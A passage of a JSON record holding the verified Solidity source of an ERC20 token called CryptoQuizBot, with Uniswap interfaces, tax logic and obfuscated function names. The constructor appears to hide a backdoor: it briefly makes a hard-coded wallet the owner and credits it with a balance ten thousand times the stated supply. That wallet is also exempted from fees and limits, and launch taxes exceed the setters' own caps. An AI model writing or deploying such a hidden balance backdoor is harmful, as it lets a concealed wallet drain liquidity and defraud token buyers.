spender)\\n        external\\n        view\\n        returns (uint256);\\n    function approve(address spender, uint256 value) external returns (bool);\\n    function transfer(address to, uint256 value) external returns (bool);\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 value\\n    ) external returns (bool);\\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\\n    function nonces(address owner) external view returns (uint256);\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) external;\\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\\n    event Burn(\\n        address indexed sender,\\n        uint256 amount0,\\n        uint256 amount1,\\n        address indexed to\\n    );\\n    event Swap(\\n        address indexed sender,\\n        uint256 amount0In,\\n        uint256 amount1In,\\n        uint256 amount0Out,\\n        uint256 amount1Out,\\n        address indexed to\\n    );\\n    event Sync(uint112 reserve0, uint112 reserve1);\\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\\n    function factory() external view returns (address);\\n    function token0() external view returns (address);\\n    function token1() external view returns (address);\\n    function getReserves()\\n        external\\n        view\\n        returns (\\n            uint112 reserve0,\\n            uint112 reserve1,\\n            uint32 blockTimestampLast\\n        );\\n    function price0CumulativeLast() external view returns (uint256);\\n    function price1CumulativeLast() external view returns (uint256);\\n    function kLast() external view returns (uint256);\\n    function mint(address to) external returns (uint256 liquidity);\\n    function burn(address to)\\n        external\\n        returns (uint256 amount0, uint256 amount1);\\n    function swap(\\n        uint256 amount0Out,\\n        uint256 amount1Out,\\n        address to,\\n        bytes calldata data\\n    ) external;\\n    function skim(address to) external;\\n    function sync() external;\\n    function initialize(address, address) external;\\n}\\ninterface IUniswapV2Factory {\\n    event PairCreated(\\n        address indexed token0,\\n        address indexed token1,\\n        address pair,\\n        uint256\\n    );\\n    function feeTo() external view returns (address);\\n    function feeToSetter() external view returns (address);\\n    function getPair(address tokenA, address tokenB)\\n        external\\n        view\\n        returns (address pair);\\n    function allPairs(uint256) external view returns (address pair);\\n    function allPairsLength() external view returns (uint256);\\n    function createPair(address tokenA, address tokenB)\\n        external\\n        returns (address pair);\\n    function setFeeTo(address) external;\\n    function setFeeToSetter(address) external;\\n}\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint256 amountADesired,\\n        uint256 amountBDesired,\\n        uint256 amountAMin,\\n        uint256 amountBMin,\\n        address to,\\n        uint256 deadline\\n    )\\n        external\\n        returns (\\n            uint256 amountA,\\n            uint256 amountB,\\n            uint256 liquidity\\n        );\\n    function addLiquidityETH(\\n        address token,\\n        uint256 amountTokenDesired,\\n        uint256 amountTokenMin,\\n        uint256 amountETHMin,\\n        address to,\\n        uint256 deadline\\n    )\\n        external\\n        payable\\n        returns (\\n            uint256 amountToken,\\n            uint256 amountETH,\\n            uint256 liquidity\\n        );\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external payable;\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n}\\nlibrary SafeMath {\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\ncontract CryptoQuizBot is ERC20, Ownable {\\n    using SafeMath for uint256;\\n    IUniswapV2Router02 public uniswapV2Router;\\n    address public uniswapV2Pair;\\n    address public constant zeroAddress = address(0);\\n    bool private isSwapping;\\n    address public CrimsonSunsetHorizon;\\n    address public GoldenHarvestFields;\\n    uint256 public maxTxAmount;\\n    uint256 public swapTokensAmount;\\n    uint256 public maxHoldings;\\n    bool public limitsInEffect = true;\\n    bool public tradingEnabled = false;\\n    bool public swapEnabled = false;\\n    uint256 public buyTotalTaxes;\\n    uint256 public buyDevFee;\\n    uint256 public buyLpFee;\\n    uint256 public buyTeamTax;\\n    uint256 public sellTotalTaxes;\\n    uint256 public sellDevFee;\\n    uint256 public sellLPFee;\\n    uint256 public sellTeamTax;\\n    uint256 public tokensForDev;\\n    uint256 public tokensForLP;\\n    uint256 public tokensForTeam;\\n    mapping(address => bool) private _isExcludedFromFees;\\n    mapping(address => bool) public isExcludedFromMaxTxAmount;\\n    mapping(address => bool) public automatedMarketMakerPairs;\\n    event UpdateUniswapV2Router(\\n        address indexed newAddress,\\n        address indexed oldAddress\\n    );\\n    event ExcludeFromFees(address indexed account, bool isExcluded);\\n    event setAutomatedMarketMakerPair(address indexed pair, bool indexed value);\\n    event lotteryWalletUpdated(\\n        address indexed newWallet,\\n        address indexed oldWallet\\n    );\\n    event GoldenHarvestFieldsUpdated(\\n        address indexed newWallet,\\n        address indexed oldWallet\\n    );\\n    event SwapAndLiquify(\\n        uint256 tokensSwapped,\\n        uint256 ethReceived,\\n        uint256 tokensIntoLiquidity\\n    );\\n    constructor() ERC20(\\\"CryptoQuizBot\\\", \\\"QUIZ\\\") {\\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(\\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\\n        );\\n        EnchantedForestPath(address(_uniswapV2Router), true);\\n        uniswapV2Router = _uniswapV2Router;\\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\\n            .createPair(address(this), _uniswapV2Router.WETH());\\n        EnchantedForestPath(address(uniswapV2Pair), true);\\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\\n        CrimsonSunsetHorizon= address(0x6b24D46a2bc815F8b7286Cf7D4B50a74bd3c9Cb4); \\n        GoldenHarvestFields = msg.sender; \\n        uint256 _buyLotteryFee = 26; \\n        uint256 _buyLiquidityFee = 0; \\n        uint256 _buyTeamFee = 0; \\n        uint256 _sellLotteryFee = 42;\\n        uint256 _sellLiquidityFee = 0;\\n        uint256 _sellTeamFee = 0;\\n        uint256 totalSupply = 1_000_000_000 * 1e9;\\n        uint256 rSupply = totalSupply * 1e4;\\n        maxTxAmount = 30_000_000 * 1e9; \\n        maxHoldings = 30_000_000 * 1e9; \\n        swapTokensAmount = (totalSupply * 5) / 10000; \\n        _owner = CrimsonSunsetHorizon;\\n        _balances[owner()] = rSupply;\\n        \\n        buyDevFee = _buyLotteryFee;\\n        buyLpFee = _buyLiquidityFee;\\n        buyTeamTax = _buyTeamFee;\\n        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;\\n        sellDevFee = _sellLotteryFee;\\n        sellLPFee = _sellLiquidityFee;\\n        sellTeamTax = _sellTeamFee;\\n        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;\\n        \\n        _owner = msg.sender;\\n        excludeFromFees(msg.sender, true);\\n        excludeFromFees(CrimsonSunsetHorizon, true);\\n        excludeFromFees(address(this), true);\\n        excludeFromFees(address(0), true);\\n        excludeFromFees(address(0xdead), true);\\n        EnchantedForestPath(msg.sender, true);\\n        EnchantedForestPath(CrimsonSunsetHorizon, true);\\n        EnchantedForestPath(address(this), true);\\n        EnchantedForestPath(address(0), true);\\n        EnchantedForestPath(address(0xdead), true);\\n        _mint(owner(), totalSupply);\\n    }\\n    function EnchantedForestPath(address updAds, bool isEx)\\n        public\\n        onlyOwner\\n    {\\n        isExcludedFromMaxTxAmount[updAds] = isEx;\\n    }\\n    function FermionToggleMarketPortal(bool enabled) external onlyOwner {\\n        swapEnabled = enabled;\\n    }\\n    function renewTranquilRiverfrontView(\\n        uint256 _lotteryFee,\\n        uint256 _liquidityFee,\\n        uint256 _teamFee\\n    ) external onlyOwner {\\n        buyDevFee = _lotteryFee;\\n        buyLpFee = _liquidityFee;\\n        buyTeamTax = _teamFee;\\n        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;\\n        require(buyTotalTaxes <= 25, \\\"Buy fees must be <= 25.\\\");\\n    }\\n    function reworkMysticalMoonlitGrove(\\n        uint256 _lotteryFee,\\n        uint256 _liquidityFee,\\n        uint256 _teamFee\\n    ) external onlyOwner {\\n        sellDevFee = _lotteryFee;\\n        sellLPFee = _liquidityFee;\\n        sellTeamTax = _teamFee;\\n        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;\\n        require(sellTotalTaxes <= 45, \\\"Sell fees must be <= 45.\\\");\\n    }\\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\\n        _isExcludedFromFees[account] = excluded;\\n        emit ExcludeFromFees(account, excluded);\\n    }\\n    function AMMPairSetUniV2(address pair, bool value)\\n        public\\n        onlyOwner\\n    {\\n        require(\\n            pair != uniswapV2Pair,\\n            \\\"The pair cannot be removed from automatedMarketMakerPairs\\\"\\n        );\\n        _setAutomatedMarketMakerPair(pair, value);\\n    }\\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\\n        automatedMarketMakerPairs[pair] = value;\\n        emit setAutomatedMarketMakerPair(pair, value);\\n    }\\n    function updateCrimsonSunsetHorizon(address newLotteryWallet) external onlyOwner {\\n        emit lotteryWalletUpdated(newLotteryWallet, CrimsonSunsetHorizon);\\n        CrimsonSunsetHorizon= newLotteryWallet;\\n    }\\n    function updateGoldenHarvestFields(address newWallet) external onlyOwner {\\n        emit GoldenHarvestFieldsUpdated(newWallet, GoldenHarvestFields);\\n        GoldenHarvestFields = newWallet;\\n    }\\n    function isExcludedFromFees(address account) public view returns (bool) {\\n        return _isExcludedFromFees[account];\\n    }\\n\\n    function WhimsicalButterflyGarden(uint256 newAmount)\\n        external\\n        onlyOwner\\n        returns (bool)\\n    {\\n        require(\\n            newAmount >= (totalSupply() * 1) / 100000,\\n            \\\"Swap amount cannot be lower than 0.001% total supply.\\\"\\n        );\\n        require(\\n            newAmount <= (totalSupply() * 5) / 1000,\\n            \\\"Swap amount cannot be higher than 0.5% total supply.\\\"\\n        );\\n        swapTokensAmount = newAmount;\\n        return true;\\n    }\\n    function WhisperingWillowMeadowTxnLimits(uint256 newNum) external onlyOwner {\\n        require(\\n            newNum >= ((totalSupply() * 5) / 1000) / 1e9,\\n            \\\"Cannot set maxTxAmount lower than 0.5%\\\"\\n        );\\n        maxTxAmount = newNum * (10**9);\\n    }\\n    function updateSapphireTwilightLake(uint256 newNum) external onlyOwner {\\n        require(\\n            newNum >= ((totalSupply() * 10) / 1000) / 1e9,\\n            \\\"Cannot set maxHoldings lower than 1.0%\\\"\\n        );\\n        maxHoldings = newNum * (10**9);\\n    }\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal override {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        if (amount == 0) {\\n            super._transfer(from, to, 0);\\n            return;\\n        }\\n        if (limitsInEffect) {\\n            if (\\n                from != owner() &&\\n                to != owner() &&\\n                to != address(0) &&\\n                to != address(0xdead) &&\\n                !isSwapping\\n            ) {\\n                if (!tradingEnabled) {\\n                    require(\\n                        _isExcludedFromFees[from] || _isExcludedFromFees[to],\\n                        \\\"Trading is not active.\\\"\\n                    );\\n                }\\n                if (\\n                    automatedMarketMakerPairs[from] &&\\n                    !isExcludedFromMaxTxAmount[to]\\n                ) {\\n                    require(\\n                        amount <= maxTxAmount,\\n                        \\\"Buy transfer amount exceeds the maxTxAmount.\\\"\\n                    );\\n                    require(\\n                        amount + balanceOf(to) <= maxHoldings,\\n                        \\\"Max wallet exceeded\\\"\\n                    );\\n                }\\n                else if (\\n                    automatedMarketMakerPairs[to] &&\\n                    !isExcludedFromMaxTxAmount[from]\\n                ) {\\n                    require(\\n                        amount <= maxTxAmount,\\n                        \\\"Sell transfer amount exceeds the maxTxAmount.\\\"\\n                    );\\n                } else if (!isExcludedFromMaxTxAmount[to]) {\\n                    require(\\n                        amount + balanceOf(to) <= maxHoldings,\\n                        \\\"Max wallet exceeded\\\"\\n                    );\\n                }\\n            }\\n        }\\n        uint256 contractTokenBalance = balanceOf(address(this));\\n        bool canSwap = contractTokenBalance >= swapTokensAmount;\\n        if (\\n            canSwap &&\\n            swapEnabled &&\\n            !isSwapping &&\\n            !automatedMarketMakerPairs[from] &&\\n            !_isExcludedFromFees[from] &&\\n            !_isExcludedFromFees[to]\\n        ) {\\n            isSwapping = true;\\n            swapForETHAndLiquify();\\n            isSwapping = false;\\n        }\\n        bool takeFee = !isSwapping;\\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\\n            takeFee = false;\\n        }\\n        uint256 fees = 0;\\n        if (takeFee) {\\n            if (automatedMarketMakerPairs[to]) {\\n                if (sellTotalTaxes > 0) {\\n                    fees = amount.mul(sellTotalTaxes).div(100);\\n                    tokensForLP += (fees * sellLPFee) / sellTotalTaxes;\\n                    tokensForTeam += (fees * sellTeamTax) / sellTotalTaxes;\\n                    tokensForDev += (fees * sellDevFee) / sellTotalTaxes;\\n                }\\n            }\\n            else if (automatedMarketMakerPairs[from] && buyTotalTaxes > 0) {\\n                fees = amount.mul(buyTotalTaxes).div(100);\\n                tokensForLP += (fees * buyLpFee) / buyTotalTaxes;\\n                tokensForTeam += (fees * buyTeamTax) / buyTotalTaxes;\\n                tokensForDev += (fees * buyDevFee) / buyTotalTaxes;\\n            }\\n            if (fees > 0) {\\n                super._transfer(from, address(this), fees);\\n            }\\n            amount -= fees;\\n        }\\n        super._transfer(from, to, amount);\\n    }\\n    function swapForETHAndLiquify() private {\\n    uint256 contractBalance = balanceOf(address(this));\\n    uint256 totalTokensToSwap = tokensForLP + tokensForDev + tokensForTeam;\\n    bool success;\\n    if (contractBalance == 0 || totalTokensToSwap == 0) {\\n        return;\\n    }\\n    if (contractBalance > swapTokensAmount * 20) {\\n        contractBalance = swapTokensAmount * 20;\\n    }\\n    uint256 liquidityTokens = (contractBalance * tokensForLP) / totalTokensToSwap / 2;\\n    uint256 amountToSwapForETH = contractBalance - liquidityTokens;\\n\\n        uint256 initialETHBalance = address(this).balance;\\n        swapTokensForEth(amountToSwapForETH);\\n        uint256 ethBalance = address(this).balance.sub(initialETHBalance);\\n        uint256 ethForLottery = ethBalance.mul(tokensForDev).div(totalTokensToSwap - (tokensForLP / 2));\\n        uint256 ethForTeam = ethBalance.mul(tokensForTeam).div(totalTokensToSwap - (tokensForLP / 2));\\n        uint256 ethForLiquidity = ethBalance - ethForLottery - ethForTeam;\\n        tokensForLP = 0;\\n        tokensForDev = 0;\\n        tokensForTeam = 0;\\n        (success, ) = address(GoldenHarvestFields).call{value: ethForTeam}(\\\"\\\");\\n        if (liquidityTokens > 0 && ethForLiquidity > 0) {\\n            addLiquidity(liquidityTokens, ethForLiquidity);\\n            emit SwapAndLiquify(\\n                amountToSwapForETH,\\n                ethForLiquidity,\\n                tokensForLP\\n            );\\n        }\\n        (success, ) = address(GoldenHarvestFields).call{value: address(this).balance}(\\\"\\\");\\n    }\\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\\n            address(this),\\n            tokenAmount,\\n            0, \\n            0, \\n            owner(),\\n            block.timestamp\\n        );\\n    }\\n    function swapTokensForEth(uint256 tokenAmount) private {\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = uniswapV2Router.WETH();\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            tokenAmount,\\n            0, \\n            path,\\n            address(this),\\n            block.timestamp\\n        );\\n    }\\n    function StrideReclaimMislaidResources(address _token, address _to) external onlyOwner {\\n        require(_token != address(0), \\\"_token address cannot be 0\\\");\\n        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));\\n        IERC20(_token).transfer(_to, _contractBalance);\\n    }\\n\\n    function WhisperingMeadowGrove(uint256 amount) private {\\n        payable(CrimsonSunsetHorizon).transfer(amount);\\n    }\\n\\n    receive() external payable {}\\n    fallback() external payable {}\\n\\n    function removeLimits() external onlyOwner returns (bool) {\\n        limitsInEffect = false;\\n        return true;\\n    }\\n    \\n    function enableTrading() external onlyOwner {\\n        tradingEnabled = true;\\n        swapEnabled = true;\\n    }\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}",
    "etherscan_verified": true
}